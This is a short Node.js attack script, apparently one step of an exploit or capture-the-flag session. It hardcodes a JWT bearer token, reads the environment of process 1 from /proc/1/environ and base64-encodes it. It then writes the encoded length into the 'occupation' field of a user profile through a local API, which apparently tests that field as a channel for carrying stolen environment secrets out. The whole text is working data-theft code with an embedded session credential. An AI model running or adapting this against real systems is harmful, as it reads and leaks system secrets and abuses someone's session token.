const fs = require('fs');
const bearer = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczovL3BsYXllcmFwaS5odWJnYW1pbmcuY29tL2FwaS9wbGF5ZXIvYXV0aC9sb2dpbiIsImlhdCI6MTc5MzMwNDI5NSwiZXhwIjoxNzkzNDc3MDk1LCJuYmYiOjE3OTMzMDQyOTUsImp0aSI6ImF3aEJRRnE4NGUxVjlOYVAiLCJzdWIiOiIxMDEzMjY1MyIsInBydiI6IjFkMGEwMjBhY2Y1YzRiNmM0OTc5ODlkZjFhYmYwZmJkNGU4YzhkNjMiLCJ3ZWJzaXRlX2lkIjoyNH0.AmXosZKSvDqyTM0J71vuEqUksmiccwRse8Sl-VAw4_E';
(async () => {
  const env = fs.readFileSync('/proc/1/environ');
  const b64 = env.toString('base64');
  const r = await fetch('http://localhost:3000/api/user/profile', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Cookie': 'bearer=' + bearer
    },
    body: JSON.stringify({ occupation: 'LEN:' + b64.length })
  });
  await r.text();
})();
